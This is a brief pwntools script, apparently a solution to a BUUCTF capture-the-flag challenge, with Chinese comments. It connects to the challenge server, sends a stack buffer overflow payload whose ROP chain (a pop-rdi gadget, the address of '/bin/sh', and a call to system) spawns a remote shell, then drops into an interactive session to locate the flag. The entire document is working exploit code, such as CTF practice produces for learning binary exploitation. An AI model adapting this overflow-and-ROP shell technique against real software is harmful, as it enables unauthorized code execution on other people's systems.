from pwn import *

p = remote("node4.buuoj.cn",29747)
#p = process('./')
context.log_level = "debug"

sys_addr = 0x4005E3
bin_sh = 0x601048
rdi_addr = 0x400683     #Ubuntu 18+ 添加ret地址栈对齐

payload = b'a'*(0x10 + 8) + p64(rdi_addr) + p64(bin_sh) + p64(sys_addr)
p.recv()
p.sendline(payload)

p.interactive()

#使用 find -name flag 查找flag